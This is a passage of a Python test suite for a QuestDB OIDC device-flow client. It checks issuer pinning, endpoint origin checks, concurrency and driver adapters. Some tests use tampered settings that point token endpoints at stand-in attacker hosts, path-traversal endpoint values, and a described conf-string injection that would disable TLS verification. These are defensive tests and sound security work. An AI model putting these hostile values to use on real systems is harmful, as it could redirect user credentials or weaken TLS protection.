            },
        }
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, interactive=True, renderer=Renderer(),
            _clock=FakeClock())
        self.assertEqual(auth.config.token_endpoint, self.base + '/token')
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')
        self.assertEqual(auth.token(), ID_TOKEN)

    def test_well_known_fallback_for_device_endpoint(self):
        # Settings advertise OIDC + token endpoint but NOT the device endpoint;
        # issuer= is pinned, so the IdP .well-known fallback is allowed.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid',
            'acl.oidc.groups.encoded.in.token': False,
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        auth = OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                           insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')

    def test_device_fallback_without_issuer_is_rejected(self):
        # M4: QuestDB advertises the token endpoint but not the device
        # endpoint, and no issuer is pinned. Discovery would otherwise be
        # steered by the (possibly tampered) /settings response, so refuse and
        # demand an out-of-band issuer pin — even though a usable .well-known
        # is reachable here, it must NOT be fetched.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        with self.assertRaises(OidcConfigError) as cm:
            OidcDeviceAuth.from_questdb(self.base, insecure=True)
        self.assertIn('issuer', str(cm.exception))

    def test_device_fallback_with_discovery_url_is_accepted(self):
        # discovery_url= is an out-of-band pin too, accepted in lieu of issuer=.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {
            'issuer': self.base,
            'token_endpoint': self.base + '/token',
            'device_authorization_endpoint': self.base + '/device',
        }
        auth = OidcDeviceAuth.from_questdb(
            self.base,
            discovery_url=self.base + '/.well-known/openid-configuration',
            insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')

    def test_discovery_url_rejects_off_origin_issuer_in_doc(self):
        # M4: discovery_url= is advertised as an out-of-band pin, but the doc it
        # points to could declare an attacker issuer AND endpoints all on one
        # (attacker) origin — which passes co-location / issuer-origin vacuously.
        # The discovered issuer must share the pinned discovery_url origin (OIDC
        # Discovery §4.3), else refuse. /settings advertises NO endpoints, so
        # both come from the (hostile) doc — the exact gap the fix closes.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
        }}
        self.state.well_known = {
            'issuer': 'https://attacker.example.net',
            'token_endpoint': 'https://attacker.example.net/token',
            'device_authorization_endpoint':
                'https://attacker.example.net/device',
        }
        with self.assertRaises(OidcConfigError) as cm:
            OidcDeviceAuth.from_questdb(
                self.base,
                discovery_url=self.base + '/.well-known/openid-configuration',
                insecure=True)
        self.assertIn('origin', str(cm.exception).lower())

    def test_oidc_disabled_raises(self):
        self.state.settings = {'config': {'acl.oidc.enabled': False}}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_missing_device_endpoint_raises(self):
        # issuer= is pinned (so the fallback is allowed), but the IdP's
        # discovery doc carries no device_authorization_endpoint: that is the
        # error under test, not the missing-issuer guard above.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = {'issuer': self.base,
                                 'token_endpoint': self.base + '/token'}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_non_dict_well_known_doc_raises_config_error(self):
        # M2: an IdP discovery document that is valid JSON but not an object
        # (a list/null/number/string from a captive portal, a misconfigured
        # proxy, or a hostile IdP) must surface as a typed OidcConfigError, not
        # a raw AttributeError from doc.get(...). issuer= is pinned so the
        # fallback is allowed; the doc's shape is the error under test.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
        }}
        self.state.well_known = []  # valid JSON, but not an object
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_malformed_endpoint_port_raises_config_error(self):
        # /settings advertising a non-integer port in an endpoint must raise
        # OidcConfigError (the typed contract), not a bare ValueError that
        # callers catching OidcError would miss. See M6.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://idp:notaport/token',
            'acl.oidc.device.authorization.endpoint':
                'https://idp:notaport/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_loopback_flow_not_implemented(self):
        # Reserved-but-unimplemented flow raises an OidcError subclass so it's
        # caught by `except OidcError` like other config problems.
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, flow='loopback',
                                        insecure=True)

    def test_endpoint_origin_mismatch_rejected(self):
        # /settings advertises the device endpoint on a different origin than
        # the token endpoint: refuse rather than POST credentials off-origin.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint':
                'http://127.0.0.2:9/device',  # different host:port
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, insecure=True)

    def test_issuer_pin_rejects_off_origin_endpoints(self):
        # Endpoints are internally consistent, but an explicit issuer pins them
        # to a different origin -> reject (a compromised /settings can't
        # redirect the token POST when the IdP is pinned).
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(
                self.base, issuer='https://idp.attacker.example',
                insecure=True)

    def test_issuer_pin_accepts_matching_origin(self):
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        auth = OidcDeviceAuth.from_questdb(
            self.base, issuer=self.base, insecure=True, renderer=Renderer())
        self.assertEqual(auth.config.device_authorization_endpoint,
                         self.base + '/device')

    def test_well_known_404_raises_oidc_error(self):
        # issuer pinned (so the IdP fallback is allowed), but the .well-known
        # document 404s: get_json maps the non-2xx to OidcError rather than a
        # silent miss that would later masquerade as a missing-endpoint error.
        # See M4.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token'}}
        self.state.well_known = None  # the handler returns 404 for /.well-known
        with self.assertRaises(OidcError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_connect_forwards_default_interval(self):
        # M5: connect(**opts) routes through from_questdb; default_interval must
        # be accepted (it previously raised TypeError) and reach the auth.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device'}}
        qdb = connect(self.base, insecure=True, eager=False, default_interval=9,
                      renderer=Renderer(), interactive=True, _clock=FakeClock())
        self.assertEqual(qdb.auth._default_interval, 9)


class TestInsecureSettingsGuard(unittest.TestCase):
    """
    M1: a /settings response fetched over plaintext http to a non-loopback host
    (only reachable with insecure=True) is MITM-able, so IdP endpoints it
    advertises must not be trusted to route the device code / refresh token
    without an out-of-band issuer/discovery_url pin — even when BOTH endpoints
    are present (so the co-location check would otherwise pass trivially).
    """

    _TAMPERED = {
        'acl.oidc.enabled': True,
        'acl.oidc.client.id': 'questdb',
        'acl.oidc.token.endpoint': 'https://evil.example.com/token',
        'acl.oidc.device.authorization.endpoint':
            'https://evil.example.com/device',
    }

    def _resolve(self, settings, **kw):
        # Stub the network: /settings returns the given (possibly tampered) map,
        # and IdP discovery must never be contacted in these guard paths.
        from questdb.auth import _discovery
        with mock.patch.object(_discovery, 'fetch_settings',
                               return_value=settings), \
             mock.patch.object(
                 _discovery, 'discover_device_endpoint_from_idp',
                 side_effect=AssertionError('IdP discovery must not run')):
            return _discovery.resolve_config(**kw)

    def test_both_endpoints_over_plaintext_without_pin_rejected(self):
        # The M1 case: both endpoints present at one (attacker) origin, plaintext
        # channel, no pin -> refuse, and never contact the IdP.
        with self.assertRaises(OidcConfigError) as cm:
            self._resolve(self._TAMPERED,
                          questdb_url='http://qdb.internal.example:9000',
                          insecure=True)
        self.assertIn('issuer', str(cm.exception))

    def test_plaintext_guard_does_not_fire_for_loopback(self):
        # Loopback http never leaves the host, so /settings is not MITM-able;
        # the guard must not fire (the common local-dev path).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='http://127.0.0.1:9000', insecure=True)
        self.assertEqual(cfg.token_endpoint, 'https://evil.example.com/token')

    def test_plaintext_guard_does_not_fire_over_https(self):
        # Over https /settings is authenticated by TLS; the documented
        # trust-the-server behavior is preserved (issuer= stays optional).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='https://qdb.example.com:9000')
        self.assertEqual(cfg.device_authorization_endpoint,
                         'https://evil.example.com/device')

    def test_explicit_endpoints_over_plaintext_are_trusted(self):
        # Endpoints the caller passed explicitly are not /settings-supplied, so
        # the guard must not force a pin even over a plaintext channel.
        cfg = self._resolve(
            {'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb'},
            questdb_url='http://qdb.internal.example:9000', insecure=True,
            token_endpoint='https://idp.example.com/token',
            device_authorization_endpoint='https://idp.example.com/device')
        self.assertEqual(cfg.token_endpoint, 'https://idp.example.com/token')

    def test_pin_satisfies_guard_over_plaintext(self):
        # With an out-of-band issuer pin the guard is satisfied (the actual
        # origin validation then happens in OidcDeviceAuth.__init__).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='http://qdb.internal.example:9000',
                            insecure=True, issuer='https://evil.example.com')
        self.assertEqual(cfg.token_endpoint, 'https://evil.example.com/token')

    def test_issuer_path_scopes_settings_endpoints(self):
        # M1: a tampered /settings advertising a DIFFERENT realm's endpoints on
        # the SAME host (Keycloak path-based multi-tenancy) is rejected when the
        # issuer is pinned to a specific realm — the origin check alone can't
        # catch it because both realms share one origin.
        kc = 'https://idp.example.com/realms'
        evil = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint':
                kc + '/EVIL/protocol/openid-connect/token',
            'acl.oidc.device.authorization.endpoint':
                kc + '/EVIL/protocol/openid-connect/auth/device'}
        with self.assertRaises(OidcConfigError) as cm:
            self._resolve(evil, questdb_url='https://qdb.example.com:9000',
                          issuer=kc + '/prod')
        self.assertIn('issuer', str(cm.exception).lower())
        # The pinned realm's own endpoints are accepted.
        good = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint':
                kc + '/prod/protocol/openid-connect/token',
            'acl.oidc.device.authorization.endpoint':
                kc + '/prod/protocol/openid-connect/auth/device'}
        cfg = self._resolve(good, questdb_url='https://qdb.example.com:9000',
                            issuer=kc + '/prod')
        self.assertEqual(cfg.token_endpoint,
                         kc + '/prod/protocol/openid-connect/token')

    def test_issuer_path_scope_skips_explicit_endpoints(self):
        # Caller-explicit endpoints are trusted and NOT path-checked, so an IdP
        # that places endpoints outside the issuer path (e.g. Azure AD) still
        # works when the endpoints are passed explicitly.
        cfg = self._resolve(
            {'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb'},
            questdb_url='https://qdb.example.com:9000',
            issuer='https://idp.example.com/realms/prod',
            token_endpoint='https://idp.example.com/oauth2/v2.0/token',
            device_authorization_endpoint=(
                'https://idp.example.com/oauth2/v2.0/devicecode'))
        self.assertEqual(cfg.token_endpoint,
                         'https://idp.example.com/oauth2/v2.0/token')

    def test_issuer_path_scope_rejects_dot_segment_traversal(self):
        # A tampered /settings can't slip a different realm past the issuer-path
        # scope with a '..' segment: '/realms/prod/../EVIL/...' satisfies a naive
        # prefix test but the IdP normalizes it to the EVIL realm. The dotted
        # path must be rejected (even percent-encoded). See
        # _endpoint_path_under_issuer.
        kc = 'https://idp.example.com/realms'
        for ep in (kc + '/prod/../EVIL/protocol/openid-connect',
                   kc + '/prod/%2e%2e/EVIL/protocol/openid-connect'):
            evil = {
                'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
                'acl.oidc.token.endpoint': ep + '/token',
                'acl.oidc.device.authorization.endpoint': ep + '/auth/device'}
            with self.assertRaises(OidcConfigError) as cm:
                self._resolve(evil, questdb_url='https://qdb.example.com:9000',
                              issuer=kc + '/prod')
            self.assertIn('issuer', str(cm.exception).lower())


@unittest.skipIf(pd is None, 'pandas not installed')
class TestRestAdapter(AuthTestBase):
    def _connected(self):
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid groups',
            'acl.oidc.groups.encoded.in.token': True,
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        self.state.expected_bearer = ID_TOKEN
        return connect(self.base, insecure=True, renderer=Renderer(),
                       interactive=True, _clock=FakeClock())

    def test_sql_returns_dataframe(self):
        qdb = self._connected()
        df = qdb.sql('SELECT * FROM trades')
        self.assertEqual(list(df.columns), ['ts', 'price'])
        self.assertEqual(len(df), 2)
        self.assertEqual(df['price'].tolist(), [1.5, 2.5])
        # TIMESTAMP column coerced to datetime.
        self.assertTrue(str(df['ts'].dtype).startswith('datetime64'))

    def test_sql_unauthorized_maps_to_auth_error(self):
        qdb = self._connected()
        self.state.expected_bearer = 'something-else'  # force 401
        with self.assertRaises(OidcAuthError):
            qdb.sql('SELECT 1')

    def test_connect_is_eager(self):
        qdb = self._connected()
        self.assertIsInstance(qdb, QuestDB)
        # Sign-in already happened during connect().
        self.assertEqual(self.state.device_requests, 1)

    def test_sql_query_error_maps_to_oidc_error(self):
        qdb = self._connected()
        self.state.exec_status = 400
        self.state.exec_response = {'error': 'unexpected token', 'position': 5}
        with self.assertRaises(OidcError) as cm:
            qdb.sql('SELEKT 1')
        self.assertIn('unexpected token', str(cm.exception))
        self.assertNotIsInstance(cm.exception, OidcAuthError)

    def test_sql_passes_limit(self):
        qdb = self._connected()
        qdb.sql('SELECT * FROM trades', limit='1,10')
        self.assertTrue(any('limit=1' in p for p in self.state.exec_requests))

    def test_sql_handles_empty_dataset(self):
        qdb = self._connected()
        self.state.exec_response = {'ddl': 'OK'}  # no columns / dataset
        df = qdb.sql('CREATE TABLE x (a INT)')
        self.assertEqual(len(df), 0)

    def test_sql_malformed_shape_raises_oidc_error(self):
        qdb = self._connected()
        self.state.exec_response = {  # rows shorter than the column list
            'columns': [{'name': 'a', 'type': 'LONG'},
                        {'name': 'b', 'type': 'LONG'}],
            'dataset': [[1]]}
        with self.assertRaises(OidcError):
            qdb.sql('SELECT a, b FROM t')

    def test_sql_non_json_2xx_raises_oidc_error(self):
        # A 2xx body that isn't JSON (e.g. an HTML page from a reverse proxy)
        # must raise a clean OidcError, not a raw JSONDecodeError. See M3.
        qdb = self._connected()
        self.state.exec_raw = (200, 'text/html', b'<html>proxy</html>')
        with self.assertRaises(OidcError) as cm:
            qdb.sql('SELECT 1')
        self.assertNotIsInstance(cm.exception, OidcAuthError)

    def test_sql_non_dict_json_raises_oidc_error(self):
        # A valid-JSON-but-not-an-object 2xx body (e.g. a bare list) must raise
        # OidcError, not AttributeError from .get(). See M3.
        qdb = self._connected()
        self.state.exec_response = ['not', 'an', 'object']
        with self.assertRaises(OidcError) as cm:
            qdb.sql('SELECT 1')
        self.assertNotIsInstance(cm.exception, OidcAuthError)

    def test_sql_non_dict_columns_raises_oidc_error(self):
        # A /exec body whose "columns" entries aren't objects must raise a clean
        # OidcError, not an AttributeError from .get() on the column. See M3.
        qdb = self._connected()
        self.state.exec_response = {'columns': [None], 'dataset': [[1]]}
        with self.assertRaises(OidcError) as cm:
            qdb.sql('SELECT 1')
        self.assertNotIsInstance(cm.exception, OidcAuthError)

    def test_sql_non_string_column_name_raises_oidc_error(self):
        # M2: a column descriptor with a non-hashable name (a JSON list/object)
        # and a TIMESTAMP/DATE type must raise a clean OidcError, not a raw
        # TypeError ("unhashable type") from `name in df.columns` during the
        # timestamp coercion.
        qdb = self._connected()
        self.state.exec_response = {
            'columns': [{'name': ['evil'], 'type': 'TIMESTAMP'},
                        {'name': 'b', 'type': 'LONG'}],
            'dataset': [['2021-01-01T00:00:00.000000Z', 2]]}
        with self.assertRaises(OidcError) as cm:
            qdb.sql('SELECT 1')
        self.assertNotIsInstance(cm.exception, OidcAuthError)


class TestRestAdapterAuthErrors(AuthTestBase):
    """QuestDB.sql maps 401/403 to OidcAuthError BEFORE it builds a DataFrame,
    so the mapping is testable without a real pandas. Kept out of the
    pandas-gated TestRestAdapter so this security-relevant mapping runs on EVERY
    CI leg, not just the ones where pandas is installed. M5."""

    def _connected(self):
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.scope': 'openid groups',
            'acl.oidc.groups.encoded.in.token': True,
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device',
        }}
        self.state.expected_bearer = ID_TOKEN
        return connect(self.base, insecure=True, renderer=Renderer(),
                       interactive=True, _clock=FakeClock())

    @staticmethod
    def _stub_pandas():
        # sql() reaches the 401/403 check before it touches pandas, so a bare
        # stub module is enough to exercise the mapping without the real
        # (possibly absent) dependency.
        return mock.patch.dict(
            sys.modules, {'pandas': types.ModuleType('pandas')})

    def test_sql_401_maps_to_auth_error_without_pandas(self):
        qdb = self._connected()
        self.state.expected_bearer = 'something-else'  # force 401
        with self._stub_pandas(), self.assertRaises(OidcAuthError):
            qdb.sql('SELECT 1')

    def test_sql_403_maps_to_auth_error_without_pandas(self):
        qdb = self._connected()
        self.state.exec_status = 403            # bearer matches; server forbids
        self.state.exec_response = {'error': 'forbidden'}
        with self._stub_pandas(), self.assertRaises(OidcAuthError):
            qdb.sql('SELECT 1')


class TestConcurrency(AuthTestBase):
    def test_valid_cached_token_does_not_block_during_signin(self):
        # A caller with a valid cached token must NOT block behind another
        # thread's in-progress sign-in: the fast path takes no lock.
        auth = self.make_auth()
        valid = TokenSet(
            access_token='a', id_token=ID_TOKEN, refresh_token='r',
            expires_at=self._clock.now() + 3600)
        auth._cache.store(auth.cache_key, valid)

        auth._lock.acquire()  # simulate another thread mid-sign-in
        try:
            result = {}
            t = threading.Thread(
                target=lambda: result.update(tok=auth.token()))
            t.start()
            t.join(timeout=5)
            self.assertFalse(
                t.is_alive(), 'token() blocked behind an in-progress sign-in')
            self.assertEqual(result.get('tok'), ID_TOKEN)
        finally:
            auth._lock.release()

    def test_concurrent_signin_prompts_only_once(self):
        # Two threads racing with an empty cache must trigger exactly ONE
        # device flow; the loser reuses the winner's token.
        auth = self.make_auth()
        entered = threading.Event()
        release = threading.Event()

        class GatingRenderer(Renderer):
            def on_prompt(self, resp):
                entered.set()       # first thread is now inside the flow
                release.wait(5)     # ...holding the acquisition lock

        auth._renderer = GatingRenderer()
        results = {}

        def call(name):
            try:
                results[name] = auth.token()
            except Exception as e:  # noqa: BLE001
                results[name] = e

        t1 = threading.Thread(target=call, args=('a',))
        t1.start()
        self.assertTrue(entered.wait(5))   # t1 holds the lock in the flow
        t2 = threading.Thread(target=call, args=('b',))
        t2.start()
        release.set()                      # let t1 finish signing in
        t1.join(5)
        t2.join(5)
        # Fail loudly on a deadlock regression: a hung thread would otherwise
        # leak and let the assertions below pass on a stale/half-filled dict.
        self.assertFalse(t1.is_alive(), 'sign-in thread deadlocked')
        self.assertFalse(t2.is_alive(), 'waiter thread deadlocked')
        self.assertEqual(results.get('a'), ID_TOKEN)
        self.assertEqual(results.get('b'), ID_TOKEN)
        self.assertEqual(self.state.device_requests, 1)  # no second prompt

    def test_fast_path_does_not_write_tokens_field(self):
        # M4: the lock-free fast path must be READ-ONLY. Serving a valid token
        # from the shared cache must not write self._tokens — only the locked
        # slow path (and _store/clear) write it — so the lock-free reader can't
        # race a concurrent write (lost update / clear() resurrection).
        auth = self.make_auth()
        valid = TokenSet(access_token='a', id_token=ID_TOKEN, refresh_token='r',
                         expires_at=self._clock.now() + 3600)
        auth._cache.store(auth.cache_key, valid)
        self.assertIsNone(auth._tokens)            # nothing published yet
        self.assertEqual(auth.token(), ID_TOKEN)   # served via the fast path
        self.assertIsNone(auth._tokens)            # fast path did not write it

    def test_clear_on_other_instance_survives_inflight_acquire(self):
        # Two OidcDeviceAuth instances share the process-global MemoryCache
        # (same cache_key) but have separate per-instance locks. If instance B
        # clears the entry while instance A's sign-in is in flight, A's store
        # must NOT resurrect it: the per-key generation A captured before its
        # round-trip no longer matches, so the write is dropped and the cache
        # stays cleared (the next fresh load re-prompts, honoring clear()). A
        # still returns the token it just acquired. See store_if_current.
        a = self.make_auth()
        b = self.make_auth()
        self.assertEqual(a.cache_key, b.cache_key)

        class _ClearMidFlow(Renderer):
            def on_prompt(self, resp):
                b.clear()                 # concurrent clear during A's sign-in

        a._renderer = _ClearMidFlow()
        self.assertEqual(a.token(), ID_TOKEN)          # A still gets its token
        # A's store was dropped, so the shared cache is NOT repopulated; a fresh
        # instance therefore re-signs in rather than reusing the cleared token.
        self.assertNotIn(a.cache_key, _MEMORY_STORE)

    def test_store_if_current_drops_write_after_concurrent_clear(self):
        # Unit cover for the CAS primitive the cross-instance guard relies on:
        # a generation captured before a clear() must not be allowed to store.
        cache = MemoryCache()
        key = 'k'
        gen = cache.generation(key)                    # captured before clear
        cache.clear(key)                               # concurrent clear
        self.assertFalse(
            cache.store_if_current(key, TokenSet(access_token='T1'), gen))
        self.assertIsNone(cache.load(key))             # write dropped
        gen2 = cache.generation(key)                   # unraced store succeeds
        self.assertTrue(
            cache.store_if_current(key, TokenSet(access_token='T2'), gen2))
        self.assertIsNotNone(cache.load(key))


class TestAdapters(unittest.TestCase):
    """Connection adapters: tested via injected fake modules (the real
    sqlalchemy / psycopg / questdb.ingress need not be installed)."""

    def _qdb(self, url='http://db.example.com:9000', token='TKN'):
        return QuestDB(url, _FakeAuth(token), insecure=True)

    def test_sender_builds_conf_with_token(self):
        qdb = self._qdb('http://db.example.com:9000', token='TKN')
        captured = {}

        fake = types.ModuleType('questdb.ingress')

        class Sender:
            @staticmethod
            def from_conf(conf, *, token=None, **kw):
                captured.update(conf=conf, token=token, kw=kw)
                return 'SENDER'

        fake.Sender = Sender
        with mock.patch.dict(sys.modules, {'questdb.ingress': fake}):
            sender = qdb.sender(auto_flush=False)
        self.assertEqual(sender, 'SENDER')
        self.assertEqual(captured['conf'], 'http::addr=db.example.com:9000;')
        self.assertEqual(captured['token'], 'TKN')
        self.assertEqual(captured['kw'], {'auto_flush': False})

    def test_sender_https_defaults_to_443(self):
        qdb = self._qdb('https://db.example.com')  # no explicit port
        captured = {}
        fake = types.ModuleType('questdb.ingress')

        class Sender:
            @staticmethod
            def from_conf(conf, *, token=None, **kw):
                captured['conf'] = conf
                return 'S'

        fake.Sender = Sender
        with mock.patch.dict(sys.modules, {'questdb.ingress': fake}):
            qdb.sender()
        self.assertEqual(captured['conf'], 'https::addr=db.example.com:443;')

    def test_psycopg_connects_as_sso_with_token(self):
        qdb = self._qdb('http://db.example.com:9000', token='TKN')
        captured = {}
        fake = types.ModuleType('psycopg')

        def connect(**kw):
            captured.update(kw)
            return 'CONN'

        fake.connect = connect
        with mock.patch.dict(sys.modules, {'psycopg': fake}):
            conn = qdb.psycopg(connect_timeout=3)
        self.assertEqual(conn, 'CONN')
        self.assertEqual(captured['user'], '_sso')
        self.assertEqual(captured['password'], 'TKN')
        self.assertEqual(captured['host'], 'db.example.com')
        self.assertEqual(captured['port'], 8812)
        self.assertEqual(captured['dbname'], 'qdb')
        self.assertEqual(captured['connect_timeout'], 3)
        # The token is fetched at connect time (fresh per connection).
        self.assertEqual(qdb.auth.calls, 1)

    def test_sqlalchemy_engine_injects_fresh_token_per_connect(self):
        auth = _FakeAuth('TKN')
        qdb = QuestDB('http://db.example.com:9000', auth, insecure=True)
        created = {}
        events = {}
        engine_obj = object()

        fake_sa = types.ModuleType('sqlalchemy')
        fake_sa.__path__ = []

        def create_engine(url, **kw):
            created.update(url=url, engine_kw=kw)
            return engine_obj

        class _Event:
            @staticmethod
            def listens_for(target, name):
                def deco(fn):
                    events.update(name=name, fn=fn)
                    return fn
                return deco

        fake_sa.create_engine = create_engine
        fake_sa.event = _Event

        fake_eng = types.ModuleType('sqlalchemy.engine')

        class _URL:
            @staticmethod
            def create(**kw):
                created.update(kw)
                return 'URL'

        fake_eng.URL = _URL
        fake_pg = types.ModuleType('psycopg')  # drives the drivername choice

        with mock.patch.dict(sys.modules, {
                'sqlalchemy': fake_sa,
                'sqlalchemy.engine': fake_eng,
                'psycopg': fake_pg}):
            engine = qdb.sqlalchemy_engine(pool_pre_ping=True)

        self.assertIs(engine, engine_obj)
        self.assertEqual(created['drivername'], 'postgresql+psycopg')
        self.assertEqual(created['username'], '_sso')
        self.assertEqual(created['host'], 'db.example.com')
        self.assertEqual(created['port'], 8812)
        self.assertEqual(created['database'], 'qdb')
        self.assertEqual(created['url'], 'URL')
        self.assertEqual(created['engine_kw'], {'pool_pre_ping': True})
        self.assertEqual(events['name'], 'do_connect')
        # The listener injects a fresh token on each new connection.
        before = auth.calls
        for _ in range(2):
            cparams = {}
            events['fn'](None, None, [], cparams)
            self.assertEqual(cparams['password'], 'TKN')
        self.assertEqual(auth.calls - before, 2)

    def test_sender_brackets_ipv6_addr(self):
        # An IPv6 literal must be bracketed in the ILP addr=host:port conf,
        # else "::1:9000" is ambiguous to the conf parser. See M5.
        qdb = self._qdb('https://[::1]:9000')
        captured = {}
        fake = types.ModuleType('questdb.ingress')

        class Sender:
            @staticmethod
            def from_conf(conf, *, token=None, **kw):
                captured['conf'] = conf
                return 'S'

        fake.Sender = Sender
        with mock.patch.dict(sys.modules, {'questdb.ingress': fake}):
            qdb.sender()
        self.assertEqual(captured['conf'], 'https::addr=[::1]:9000;')

    def test_sender_forwards_ca_bundle_as_tls_roots(self):
        # M2: an https Sender must inherit the private CA bundle (as tls_roots)
        # so it trusts the same roots as the REST/IdP paths; http does not, and
        # an explicit tls_roots= is never overridden.
        import tempfile

        def captured_conf_kwargs(url, *, ca_bundle, **sender_kwargs):
            auth = _FakeAuth('TKN')
            auth._ca_bundle = ca_bundle
            qdb = QuestDB(url, auth, insecure=True)
            captured = {}
            fake = types.ModuleType('questdb.ingress')

            class Sender:
                @staticmethod
                def from_conf(conf, *, token=None, **kw):
                    captured['kw'] = kw
                    return 'S'

            fake.Sender = Sender
            with mock.patch.dict(sys.modules, {'questdb.ingress': fake}):
                qdb.sender(**sender_kwargs)
            return captured['kw']

        with tempfile.NamedTemporaryFile('w', suffix='.pem', delete=False) as f:
            f.write('-----dummy-----')
            ca = f.name
        try:
            # https + a real CA file -> forwarded as tls_roots.
            self.assertEqual(
                captured_conf_kwargs('https://db.example.com:9000',
                                     ca_bundle=ca).get('tls_roots'), ca)
            # http -> never forwarded (TLS roots are irrelevant).
            self.assertNotIn(
                'tls_roots',
                captured_conf_kwargs('http://db.example.com:9000',
                                     ca_bundle=ca))
            # An explicit tls_roots= wins over the inherited bundle.
            self.assertEqual(
                captured_conf_kwargs('https://db.example.com:9000',
                                     ca_bundle=ca,
                                     tls_roots='/other/ca.pem').get('tls_roots'),
                '/other/ca.pem')
        finally:
            os.unlink(ca)

    def test_psycopg_uses_bare_ipv6_host(self):
        # psycopg takes host and port separately, so the IPv6 host is passed
        # WITHOUT brackets (unlike the ILP addr= form). See M5.
        qdb = self._qdb('http://[::1]:9000')
        captured = {}
        fake = types.ModuleType('psycopg')

        def connect(**kw):
            captured.update(kw)
            return 'CONN'

        fake.connect = connect
        with mock.patch.dict(sys.modules, {'psycopg': fake}):
            qdb.psycopg()
        self.assertEqual(captured['host'], '::1')

    def test_require_host_rejects_hostless_url(self):
        # A URL with no extractable host must raise, not pass None to a driver;
        # an explicit host= override still resolves. See M5.
        for bad in ('localhost', 'questdb:9000'):
            with self.subTest(url=bad):
                with self.assertRaises(OidcConfigError):
                    QuestDB(bad, _FakeAuth(), insecure=True)._require_host()
        self.assertEqual(
            QuestDB('localhost', _FakeAuth())._require_host('h.example'),
            'h.example')

    def test_malformed_port_url_raises_config_error(self):
        # A QuestDB URL with a non-integer port must raise OidcConfigError at
        # construction, not a bare ValueError when an adapter reads .port. M3.
        with self.assertRaises(OidcConfigError):
            QuestDB('https://questdb.example.com:notaport', _FakeAuth(),
                    insecure=True)

    def test_host_with_conf_metachars_rejected(self):
        # C1: a host containing the ILP conf delimiters (';' / '=') or
        # whitespace must be rejected, never spliced into the
        # `addr=host:port;` conf string. Otherwise a crafted/tampered URL host
        # injects extra conf params — e.g. `tls_verify=unsafe_off`, which
        # silently disables the sender's TLS certificate verification, or
        # `auto_flush=off` (data loss). urlparse() keeps ';'/'=' in .hostname.
